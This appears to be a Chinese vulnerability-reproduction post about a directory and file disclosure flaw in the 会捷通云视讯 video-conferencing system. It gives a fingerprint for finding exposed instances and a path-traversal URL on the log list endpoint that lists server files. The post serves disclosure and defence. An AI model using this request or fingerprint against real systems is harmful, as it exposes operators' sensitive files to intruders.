---
title: "会捷通云视讯 list 目录文件泄露漏洞"
date: 2026-10-16 09:10:23
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "会捷通云视讯-list"
tags:
  - "会捷通云视讯-list"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息

## 漏洞影响

```
会捷通云视讯
```

## 网络测绘

```
body="/him/api/rest/v1.0/node/role"
```

## 漏洞复现

登陆页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101859423.png)

访问Url



```plain
/him/api/rest/V1.0/system/log/list?filePath=../
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101859690.png)



## 

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
